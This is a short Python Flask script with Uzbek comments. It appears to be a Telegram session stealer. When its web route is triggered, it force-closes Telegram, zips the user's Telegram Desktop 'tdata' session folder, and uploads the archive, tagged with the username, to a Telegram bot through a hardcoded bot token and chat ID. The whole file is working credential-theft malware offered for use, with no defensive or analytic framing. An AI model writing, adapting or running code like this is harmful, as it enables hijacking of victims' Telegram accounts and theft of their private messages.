import os
import zipfile
import requests
import io
from flask import Flask
from getpass import getuser

app = Flask(__name__)

# Sozlamalar
TOKEN = "8617771176:AAEeY9Kuu5kNwkpLmSkema8oKaizJ-z5Nfk"
CHAT_ID = "7086429203"

def collect_and_send():
    # Telegramni yopish (fayllarni bo'shatish uchun)
    os.system("taskkill /f /im Telegram.exe >nul 2>&1")
    
    user_name = getuser()
    tdata_path = os.path.join(os.environ['APPDATA'], "Telegram Desktop", "tdata")
    
    if not os.path.exists(tdata_path):
        return "Path not found"

    zip_buffer = io.BytesIO()
    
    with zipfile.ZipFile(zip_buffer, "w", zipfile.ZIP_DEFLATED) as zip_file:
        for root, dirs, files in os.walk(tdata_path):
            # Filtrlar
            if any(x in root.lower() for x in ['user_data', 'dumps', 'emoji', 'webview', 'temp']):
                continue
                
            for file in files:
                if file.endswith(('.log', '.exe', '.tmp')) or 'old' in file.lower():
                    continue
                
                file_path = os.path.join(root, file)
                rel_path = os.path.relpath(file_path, tdata_path)
                
                try:
                    with open(file_path, 'rb') as f:
                        zip_file.writestr(rel_path, f.read())
                except:
                    continue

    zip_buffer.seek(0)
    file_size = zip_buffer.getbuffer().nbytes
    
    if file_size < 100:
        return "Empty archive"

    # Telegram botga yuborish
    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
    files = {'document': ('tdata.zip', zip_buffer)}
    data = {'chat_id': CHAT_ID, 'caption': f'✅ Seans yig\'ildi\nUser: {user_name}\nHajm: {file_size / 1024:.2f} KB'}
    
    try:
        r = requests.post(url, data=data, files=files, timeout=100)
        return r.json()
    except Exception as e:
        return str(e)

@app.route('/')
def index():
    # Trigger orqali ishga tushirish
    result = collect_and_send()
    return {"status": "executed", "result": result}

if __name__ == "__main__":
    # Mahalliy sinov uchun
    app.run(port=5000)